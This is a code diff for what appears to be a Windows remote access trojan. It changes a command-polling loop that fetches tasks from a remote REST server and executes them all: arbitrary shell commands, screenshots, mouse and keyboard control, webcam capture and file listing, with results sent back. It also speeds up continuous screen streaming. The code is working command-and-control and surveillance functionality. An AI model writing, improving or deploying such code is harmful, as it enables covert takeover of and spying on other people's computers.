@@ -348,43 +348,52 @@ void sendPing() {
 DWORD WINAPI pollThread(LPVOID) {
     Sleep(3000);
     while(true) {
-        Sleep(2000);
+        Sleep(200);
         try { sendPing(); } catch(...) {}
         try {
-            std::string path = "/rest/v1/commands?computer=eq." + computerName + "&status=eq.pending&order=id.asc&limit=1";
+            std::string path = "/rest/v1/commands?computer=eq." + computerName + "&status=eq.pending&order=id.asc";
             std::string resp = httpsGet(path);
             if (resp.empty() || resp == "[]" || resp.size() < 5) continue;
-            std::string id = extractJson(resp, "id");
-            std::string type = extractJson(resp, "type");
-            std::string payload = extractJson(resp, "payload");
-            if (id.empty() || type.empty()) continue;
-            std::string patchBody = "{\"status\":\"running\"}";
-            httpsPatch("/rest/v1/commands?id=eq." + id, patchBody);
-            std::string result = "";
-            try {
-                if (type == "screenshot") {
-                    int mi=0;
-                    try{mi=std::stoi(payload);}catch(...){}
-                    result = takeScreenshot(mi);
-                } else if (type == "cmd") {
-                    result = execCmd(payload.empty() ? "whoami" : payload);
-                } else if (type == "mouse") {
-                    result = handleMouse(payload);
-                } else if (type == "keyboard") {
-                    result = handleKeyboard(payload);
-                } else if (type == "screen") {
-                    result = takeScreenshot(0);
-                } else if (type == "webcam") {
-                    result = captureWebcam();
-                } else if (type == "file_list") {
-                    result = listDir(payload.empty() ? "" : payload);
-                } else {
-                    result = "unknown_type";
-                }
-            } catch(...) { result = "exec_err"; }
-            std::string escaped = jsonEscape(result);
-            std::string resBody = "{\"status\":\"done\",\"result\":\"" + escaped + "\"}";
-            httpsPatch("/rest/v1/commands?id=eq." + id, resBody);
+            size_t pos = 0;
+            while ((pos = resp.find("{\"id\":", pos)) != std::string::npos) {
+                std::string chunk = resp.substr(pos);
+                size_t end = chunk.find("},\n");
+                if (end == std::string::npos) end = chunk.find("}]");
+                if (end == std::string::npos) { pos++; continue; }
+                std::string item = chunk.substr(0, end+1);
+                std::string id = extractJson(item, "id");
+                std::string type = extractJson(item, "type");
+                std::string payload = extractJson(item, "payload");
+                if (id.empty() || type.empty()) { pos += end+1; continue; }
+                std::string patchBody = "{\"status\":\"running\"}";
+                httpsPatch("/rest/v1/commands?id=eq." + id, patchBody);
+                std::string result = "";
+                try {
+                    if (type == "screenshot") {
+                        int mi=0;
+                        try{mi=std::stoi(payload);}catch(...){}
+                        result = takeScreenshot(mi);
+                    } else if (type == "cmd") {
+                        result = execCmd(payload.empty() ? "whoami" : payload);
+                    } else if (type == "mouse") {
+                        result = handleMouse(payload);
+                    } else if (type == "keyboard") {
+                        result = handleKeyboard(payload);
+                    } else if (type == "screen") {
+                        result = takeScreenshot(0);
+                    } else if (type == "webcam") {
+                        result = captureWebcam();
+                    } else if (type == "file_list") {
+                        result = listDir(payload.empty() ? "" : payload);
+                    } else {
+                        result = "unknown_type";
+                    }
+                } catch(...) { result = "exec_err"; }
+                std::string escaped = jsonEscape(result);
+                std::string resBody = "{\"status\":\"done\",\"result\":\"" + escaped + "\"}";
+                httpsPatch("/rest/v1/commands?id=eq." + id, resBody);
+                pos += end+1;
+            }
         } catch(...) {}
     }
     return 0;
@@ -394,7 +403,7 @@ DWORD WINAPI screenThread(LPVOID) {
     Sleep(3000);
     int fc=0;
     while(true) {
-        Sleep(500);
+        Sleep(200);
         try {
             std::string b64 = takeScreenshot(0);
             std::string escaped = jsonEscape(b64);
